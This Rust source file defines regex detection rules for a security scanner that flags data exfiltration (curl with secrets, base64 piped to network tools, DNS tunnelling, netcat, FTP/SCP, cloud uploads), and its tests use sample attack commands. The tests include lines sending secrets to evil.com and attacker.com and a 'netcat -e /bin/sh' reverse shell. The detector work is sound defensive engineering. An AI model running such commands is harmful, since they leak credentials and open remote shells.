use crate::rules::types::{Category, Confidence, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![ex_001(), ex_002(), ex_003(), ex_005(), ex_006(), ex_007()]
}

fn ex_001() -> Rule {
    Rule {
        id: "EX-001",
        name: "Network request with environment variable",
        description: "Detects curl/wget commands that include environment variables, potentially exfiltrating sensitive data",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r"(curl|wget)\s+.*\$[A-Z_][A-Z0-9_]*").expect("EX-001: invalid regex"),
            Regex::new(r"(curl|wget)\s+.*\$\{[A-Z_][A-Z0-9_]*\}").expect("EX-001: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1|::1|\[::1\]").expect("EX-001: invalid regex"),
        ],
        message: "Potential data exfiltration: network request with environment variable detected",
        recommendation: "Review the command and ensure no sensitive data is being sent externally",
        fix_hint: Some(
            "Use environment variable references without exposing them: ${VAR:-default}",
        ),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_002() -> Rule {
    Rule {
        id: "EX-002",
        name: "Base64 encoded network transmission",
        description: "Detects base64 encoding combined with network transmission, often used to obfuscate data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r"base64.*\|\s*(curl|wget|nc|netcat)").expect("EX-002: invalid regex"),
            Regex::new(r"(curl|wget|nc|netcat).*base64").expect("EX-002: invalid regex"),
            Regex::new(r"base64.*https?://").expect("EX-002: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1").expect("EX-002: invalid regex")],
        message: "Potential data exfiltration: base64 encoding with network transmission detected",
        recommendation: "Investigate why data is being base64 encoded before network transmission",
        fix_hint: None,
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_003() -> Rule {
    Rule {
        id: "EX-003",
        name: "DNS-based data exfiltration",
        description: "Detects DNS queries that may be used for data exfiltration (DNS tunneling)",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Tentative,
        patterns: vec![
            // dig/nslookup with variable data in subdomain
            Regex::new(r"\b(dig|nslookup|host)\s+.*\$").expect("EX-003: invalid regex"),
            // Common DNS exfil patterns
            Regex::new(r"\$\([^)]+\)\.[a-zA-Z0-9-]+\.(com|net|org|io)\b")
                .expect("EX-003: invalid regex"),
            // ping with variable subdomain
            Regex::new(r"ping\s+.*\$[A-Z_][A-Z0-9_]*.*\.").expect("EX-003: invalid regex"),
        ],
        exclusions: vec![],
        message: "Potential DNS-based data exfiltration: data encoded in DNS query detected",
        recommendation: "Review DNS queries and ensure they are not being used to exfiltrate data",
        fix_hint: None,
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_005() -> Rule {
    Rule {
        id: "EX-005",
        name: "Netcat outbound connection",
        description: "Detects netcat (nc) commands that may establish outbound connections for data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r"\b(nc|netcat)\s+(-[a-zA-Z]*\s+)*[a-zA-Z0-9.-]+\s+\d+")
                .expect("EX-005: invalid regex"),
            Regex::new(r"\b(nc|netcat)\s+.*-e").expect("EX-005: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1|::1").expect("EX-005: invalid regex"),
            Regex::new(r"-l\s").expect("EX-005: invalid regex"), // listening mode is less suspicious
        ],
        message: "Potential data exfiltration: netcat outbound connection detected",
        recommendation: "Review the netcat usage and ensure it's not being used for data exfiltration",
        fix_hint: Some("Remove netcat commands or use established APIs for network communication"),
        cwe_ids: &["CWE-200", "CWE-94"],
    }
}

fn ex_006() -> Rule {
    Rule {
        id: "EX-006",
        name: "Alternative protocol exfiltration",
        description: "Detects data exfiltration via alternative protocols (FTP, SCP, TFTP, SMTP, IRC)",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // FTP upload with credentials or data
            Regex::new(r"curl\s+-T.*ftp://").expect("EX-006: invalid regex"),
            Regex::new(r"ftp\s+-n.*<<").expect("EX-006: invalid regex"),
            // SCP/SFTP with sensitive data
            Regex::new(r"scp\s+.*\$[A-Z_]").expect("EX-006: invalid regex"),
            Regex::new(r"sftp.*<<<").expect("EX-006: invalid regex"),
            // TFTP
            Regex::new(r"tftp\s+.*-c\s*(put|get)").expect("EX-006: invalid regex"),
            // sendmail/mail with data
            Regex::new(r"(sendmail|mail)\s+.*<<<.*\$").expect("EX-006: invalid regex"),
            Regex::new(r"(sendmail|mail).*<<.*EOF").expect("EX-006: invalid regex"),
            // IRC exfiltration
            Regex::new(r"PRIVMSG.*\$[A-Z_]").expect("EX-006: invalid regex"),
            // WebSocket connections
            Regex::new(r#"WebSocket\s*\(\s*['"]wss?://"#).expect("EX-006: invalid regex"),
            Regex::new(r"wscat\s+-c").expect("EX-006: invalid regex"),
            // socat for data transfer
            Regex::new(r"socat\s+.*TCP:").expect("EX-006: invalid regex"),
            // telnet with data
            Regex::new(r"telnet\s+.*\|\s*(bash|sh)").expect("EX-006: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1").expect("EX-006: invalid regex"),
            Regex::new(r"^\s*#").expect("EX-006: invalid regex"),
        ],
        message: "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
        recommendation: "Review the command and ensure no sensitive data is being transmitted via alternative protocols.",
        fix_hint: Some("Use secure, auditable APIs instead of raw protocol commands."),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_007() -> Rule {
    Rule {
        id: "EX-007",
        name: "Cloud storage exfiltration",
        description: "Detects potential data exfiltration via cloud storage services (S3, GCS, Azure)",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Tentative,
        patterns: vec![
            // AWS S3 uploads with sensitive data
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*\$[A-Z_]").expect("EX-007: invalid regex"),
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*<\(").expect("EX-007: invalid regex"),
            // GCS uploads
            Regex::new(r"gsutil\s+(cp|mv|rsync).*\$[A-Z_]").expect("EX-007: invalid regex"),
            // Azure blob uploads
            Regex::new(r"az\s+storage\s+blob\s+upload.*\$[A-Z_]").expect("EX-007: invalid regex"),
            // rclone (multi-cloud)
            Regex::new(r"rclone\s+(copy|sync|move).*\$[A-Z_]").expect("EX-007: invalid regex"),
            // GitHub/GitLab exfiltration via commits
            Regex::new(r"git\s+config\s+user\.(email|name).*\$[A-Z_]")
                .expect("EX-007: invalid regex"),
            // Pastebin-style services
            Regex::new(r"(curl|wget).*(paste|hastebin|sprunge|ix\.io|termbin)")
                .expect("EX-007: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1").expect("EX-007: invalid regex"),
            Regex::new(r"^\s*#").expect("EX-007: invalid regex"),
        ],
        message: "Cloud storage exfiltration pattern detected. Sensitive data may be uploaded to cloud services.",
        recommendation: "Review cloud storage operations and ensure no sensitive data is being exfiltrated.",
        fix_hint: Some("Avoid uploading sensitive data to external cloud storage."),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ex_001_detects_curl_with_env() {
        let rule = ex_001();
        let test_cases = vec![
            (r#"curl https://evil.com?key=$API_KEY"#, true),
            (r#"curl -d "$SECRET" https://attacker.com"#, true),
            (r#"wget https://evil.com/$HOME"#, true),
            (r#"curl http://localhost:3000"#, false),
            (r#"curl https://api.github.com"#, false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_002_detects_base64_network() {
        let rule = ex_002();
        let test_cases = vec![
            (
                "cat secret.txt | base64 | curl -d @- https://evil.com",
                true,
            ),
            ("curl https://example.com | base64", true),
            ("base64 file.txt", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_003_detects_dns_exfil() {
        let rule = ex_003();
        let test_cases = vec![
            ("dig $DATA.evil.com", true),
            ("nslookup $SECRET.attacker.io", true),
            ("host $ENCODED.malicious.net", true),
            ("ping $TOKEN.evil.org", true),
            ("dig example.com", false),
            ("nslookup google.com", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_005_detects_netcat() {
        let rule = ex_005();
        let test_cases = vec![
            ("nc evil.com 4444", true),
            ("netcat -e /bin/sh attacker.com 1234", true),
            ("nc -l 8080", false), // listening mode excluded
            ("nc localhost 3000", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    // Snapshot tests
    #[test]
    fn snapshot_ex_001() {
        let rule = ex_001();
        let content = include_str!("../../../tests/fixtures/rules/ex_001.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_001", findings);
    }

    #[test]
    fn snapshot_ex_002() {
        let rule = ex_002();
        let content = include_str!("../../../tests/fixtures/rules/ex_002.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_002", findings);
    }

    #[test]
    fn snapshot_ex_003() {
        let rule = ex_003();
        let content = include_str!("../../../tests/fixtures/rules/ex_003.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_003", findings);
    }

    #[test]
    fn snapshot_ex_005() {
        let rule = ex_005();
        let content = include_str!("../../../tests/fixtures/rules/ex_005.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_005", findings);
    }

    #[test]
    fn snapshot_ex_006() {
        let rule = ex_006();
        let content = include_str!("../../../tests/fixtures/rules/ex_006.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_006", findings);
    }

    #[test]
    fn snapshot_ex_007() {
        let rule = ex_007();
        let content = include_str!("../../../tests/fixtures/rules/ex_007.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_007", findings);
    }
}
